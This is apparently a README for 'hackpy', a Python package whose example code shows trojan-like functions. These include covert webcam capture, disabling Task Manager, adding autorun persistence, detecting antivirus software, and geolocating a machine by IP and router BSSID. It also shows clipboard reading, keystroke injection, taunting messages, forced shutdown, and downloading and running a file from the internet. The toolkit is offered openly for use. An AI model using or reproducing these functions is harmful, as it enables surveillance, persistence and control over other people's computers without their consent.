![Python](https://www.python.org/static/img/python-logo@2x.png)
# `pip install hackpy ` :bomb:
![](https://picua.org/images/2019/07/02/a565a62aa7c27eb1339c6cb0be7c9d49.png)

# Example usage:
``` python
import hackpy


# Webcam
hackpy.webcam(filename = 'screenshot.png', delay = 4500, camera = 1)

# TaskManager
if hackpy.taskmanager.find('iexplore.exe') == True: # If process iexplore.exe found:
    hackpy.taskmanager.kill('iexplore.exe') # Stop iexplore.exe process,
    hackpy.taskmanager.start('chrome.exe') # start chrome.exe process

hackpy.taskmanager.disable() # Disable windows taskmgr.exe
hackpy.taskmanager.enable()  # Enable windows taskmgr.exe

# Autorun
hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = True) # Add cmd.exe to startup
hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = False) # Remove cmd.exe from startup

# Detect installed antivirus software on computer:
data = hackpy.detect_protection()
for antivirus in data:
    print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])

# Information about you IP:
data = hackpy.whois()
print('[?] - You IP is: ' + data['query'])
print('[?] - You live in: ' + data['country'] + ', country code: ' + data['countryCode'])
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as", "local"}

# Information about other IP:
data = hackpy.whois('216.58.215.110')
print('[?] - Other Information about IP:\n' + str(data))
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as"}

# Get geodata about you IP:
data = hackpy.geoplugin()
print('[?] - Latitude: ' + data['geoplugin_latitude'])
# Return dict: {"geoplugin_request", "geoplugin_status", "geoplugin_delay", "geoplugin_credit", "geoplugin_city", "geoplugin_region", "geoplugin_regionCode", "geoplugin_regionName", "geoplugin_areaCode", "geoplugin_dmaCode", "geoplugin_countryCode", "geoplugin_countryName", "geoplugin_inEU", "geoplugin_euVATrate", "geoplugin_continentCode", "geoplugin_continentName", "geoplugin_latitude", "geoplugin_longitude", "geoplugin_locationAccuracyRadius", "geoplugin_timezone", "geoplugin_currencyCode", "geoplugin_currencySymbol", "geoplugin_currencySymbol_UTF8", "geoplugin_currencyConverter"}

# Get router bssid:
bssid_string = hackpy.router() # BETA
# Find LATITUDE and LONGITUDE with router BSSID:
data = hackpy.bssid_locate(bssid_string)
print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', RANGE: ' + str(data['range']))

# Windows messagebox:
hackpy.messagebox('error', 'LOL', 'System has been killed :D') # none, info, error, warning, question types

# Nircmdc reference: https://nircmd.nirsoft.net
hackpy.command.nircmdc('monitor off')
hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')

# System commands
hackpy.command.system('shutdown -s -t 260')

# SendKeyPress:
hackpy.sendkey('Hello bro{ENTER}')
#Other keys: https://pastebin.com/Ns3P7UiH

# Get text from clipboard:
data = hackpy.clipboard.get()
print('Text in clipboard is ' + data)

# Set text to clipboard:
hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')

# Download python and install it:
if hackpy.check_python() == False: # Check if python installed on system. False - not installed, True - installed.
    print('Python is not installed, trying to install!')
    hackpy.install_python('3.6.0', path = 'C:\\python36') # Default version is 3.7.0 and install path is C:\python37
else:
    print('Python is installed!')

# Load and execute file from internet
# file = hackpy.wget(direct.link.here)
# os.startfile(file)
```

<br> *nircmdc reference: https://nircmd.nirsoft.net* <br>

![SITE](https://i.ibb.co/znRLN0D/image.png)
